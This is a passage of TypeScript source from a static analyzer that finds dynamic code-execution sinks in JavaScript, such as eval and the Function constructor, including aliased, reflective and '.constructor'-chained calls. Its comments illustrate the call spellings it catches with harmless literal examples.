   * form is handled by the caller, which already knows it is inside a group.
   */
  const referenceAt = (i: number, aliases: AliasTable): { spec: SinkSpec; next: number } | null => {
    const t = tokens[i];
    if (t?.kind !== 'ident') return null;

    // A RECEIVER: `globalThis.eval`, `self['Function']`, `window?.setTimeout`,
    // and a user object that was seen holding sinks (`const o = { run: eval }`).
    const table = GLOBAL_RECEIVERS.has(t.value) ? specByName : aliases.members.get(t.value);
    if (table) {
      const member = readMember(tokens, i + 1);
      const spec = member ? table.get(member.name) : undefined;
      if (member && spec) return { spec, next: member.next };
      return null;
    }

    // The sink itself, or a NAME BOUND TO IT (`const F = Function`).
    const spec = specByName.get(t.value) ?? aliases.direct.get(t.value);
    if (!spec) return null;
    // A bare name preceded by a member access is somebody else's property
    // (`redis.eval`, `registry.Function`), not the global sink.
    const prev = tokens[i - 1];
    if (isPunct(prev, '.') || isPunct(prev, '?.') || isPunct(prev, '#')) return null;
    return { spec, next: i + 1 };
  };

  // Aliases are resolved first, so `const F = Function; F('x')()` is caught.
  const aliasMap = collectAliases(
    tokens,
    specByName,
    (i, known) => referenceAt(i, known)?.spec ?? null,
  );

  const readReference = (i: number): { spec: SinkSpec; next: number } | null =>
    referenceAt(i, aliasMap);

  // One invocation, one finding. The same call can now be reached by two
  // routes — from its rooted reference (`eval.constructor('x')`) and from the
  // `.constructor` entry point below — so findings are keyed on the sink and
  // the token index the invocation ENDS at, which is identical for both.
  const recorded = new Set<string>();

  const record = (spec: SinkSpec, startTok: Token, endIndex: number): void => {
    const key = `${spec.label}:${endIndex}`;
    if (recorded.has(key)) return;
    recorded.add(key);
    const endTok = tokens[Math.min(endIndex, tokens.length) - 1];
    const end = endTok ? endTok.end : startTok.end;
    out.push({
      label: spec.label,
      line: lineOf(startTok.start),
      text: source.slice(startTok.start, end).replace(/\s+/g, ' ').trim(),
    });
  };

  /**
   * From a resolved reference, walk member accesses until a CALL is reached,
   * then judge the code argument. This is the whole point of the module: any
   * chain of accesses is consumed structurally, so no spelling of `.call` /
   * `['call']` / `?.call` needs to be enumerated.
   */
  /**
   * `Function` reached through a property that RESOLVES BACK to it.
   *
   * `.prototype` yields `Function.prototype`, whose `.constructor` is
   * `Function`; and every function's `.constructor` is `Function`, so
   * `eval.constructor('return 42')()` and `setTimeout.constructor(…)` build
   * the same object. These are chain CONTINUATIONS, not invocation methods —
   * treating them as unknown methods stopped the walk and let the call
   * through.
   */
  const functionSpec = specByName.get('Function');

  const walkInvocation = (initial: SinkSpec, refStart: number, afterRef: number): void => {
    let spec = initial;
    let j = afterRef;
    let method: string | undefined;
    // Guard against a pathological chain; real code never approaches this.
    for (let steps = 0; steps < 64; steps += 1) {
      // An OPTIONAL CALL — `f?.(…)` — is a `?.` followed directly by `(`,
      // which is a call, not a member access.
      if (isPunct(tokens[j], '?.') && isPunct(tokens[j + 1], '(')) j += 1;
      // A template tag is a call: Function`return 1`()
      if (tokens[j]?.kind === 'template') {
        if (spec.codeArgument === undefined) record(spec, tokens[refStart] as Token, j + 1);
        return;
      }
      if (isPunct(tokens[j], '(')) {
        const position = codeArgumentIndex(method);
        if (position === null) return;
        const end = matchGroup(tokens, j);
        if (spec.codeArgument === undefined) {
          record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
          return;
        }
        const candidates = codeArguments(
          callArguments(tokens, j),
          position,
          spec.variadic === true,
        );
        if (candidates.some((candidate) => spec.codeArgument?.(candidate) === true))
          record(spec, tokens[refStart] as Token, end === -1 ? j + 1 : end);
        return;
      }
      const member = readMember(tokens, j);
      if (!member) return;
      if (member.name === 'prototype') {
        // `Function.prototype…` — still the same sink's chain.
        method = undefined;
        j = member.next;
        continue;
      }
      if (member.name === 'constructor') {
        // Any function's `.constructor` IS the Function constructor.
        if (!functionSpec) return;
        spec = functionSpec;
        method = undefined;
        j = member.next;
        continue;
      }
      method = member.name;
      j = member.next;
    }
  };

  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] as Token;

    // `Reflect.apply(sink, thisArg, [code])` / `Reflect.construct(sink, [code])`
    if (t.kind === 'ident' && t.value === 'Reflect') {
      const member = readMember(tokens, i + 1);
      if (member && (member.name === 'apply' || member.name === 'construct')) {
        let k = member.next;
        while (isPunct(tokens[k], '?.')) k += 1;
        if (isPunct(tokens[k], '(')) {
          const args = callArguments(tokens, k);
          const first = args[0] ?? [];
          // The callee argument is itself a reference expression, so it is
          // resolved with the SAME reader rather than a bespoke pattern.
          const inner =
            first.length > 0
              ? findReferenceIn(first, unwrapReference(first, 0), specByName, aliasMap)
              : null;
          if (inner) {
            const isConstruct = member.name === 'construct';
            // apply(fn, thisArg, [args]) → args are the 3rd; construct(fn, [args]) → 2nd.
            const candidates = codeArguments(
              args,
              { index: isConstruct ? 1 : 2, inArray: true },
              inner.variadic === true,
            );
            const end = matchGroup(tokens, k);
            if (
              inner.codeArgument === undefined ||
              candidates.some((candidate) => inner.codeArgument?.(candidate) === true)
            ) {
              record(inner, t, end === -1 ? k + 1 : end);
            }
          }
        }
      }
      continue;
    }

    // `<receiver>.constructor(…)` — EVERY function's `.constructor` is the
    // `Function` constructor, so this call compiles source no matter what the
    // receiver is: `(()=>{}).constructor('return 42')()`,
    // `function f(){}; f.constructor(…)`, `[].map.constructor(…)`,
    // `({}).toString.constructor(…)` all build the same object.
    //
    // Which receivers are functions is NOT statically decidable — the set is
    // every function literal, every declared function, every built-in method,
    // every value flowing in from elsewhere — so gating on a recognised
    // receiver is the enumerate-the-spellings mistake this module exists to
    // end. An INVOKED `.constructor` is therefore the sink unconditionally.
    //
    // Reached only through a MEMBER ACCESS (`.constructor`, `?.constructor`,
    // `['constructor']`) on something that ends an expression, so a class's
    // `constructor(){}` method definition — a bare name — never matches. A
    // `.constructor` that is merely READ (`x.constructor === Foo`,
    // `x.constructor.name`) is not a call and is not recorded.
    if (functionSpec && endsExpression(tokens[i - 1])) {
      const ctor = readMember(tokens, i);
      if (ctor?.name === 'constructor') walkInvocation(functionSpec, i, ctor.next);
    }

    const reference = readReference(i);
    if (!reference) continue;

    // A parenthesized reference — `(eval)('x')`, `(0, Function)('x')` — is the
    // same reference with the group's `)` in between, so skip it and continue.
    let after = reference.next;
    const prev = tokens[i - 1];
    if ((isPunct(prev, '(') || isPunct(prev, ',')) && isPunct(tokens[after], ')')) {
      after += 1;
    }
    walkInvocation(reference.spec, i, after);
  }
  return out;
}

/** Resolve a sink reference written as a standalone expression (an argument). */
function findReferenceIn(
  argument: readonly Token[],
  start: number,
  specByName: ReadonlyMap<string, SinkSpec>,
  aliases: AliasTable,
): SinkSpec | null {
  const first = argument[start];
  if (first?.kind !== 'ident') return null;
  const table = GLOBAL_RECEIVERS.has(first.value) ? specByName : aliases.members.get(first.value);
  if (table) {
    const member = readMember(argument, start + 1);
    return member ? (table.get(member.name) ?? null) : null;
  }
  return specByName.get(first.value) ?? aliases.direct.get(first.value) ?? null;
}
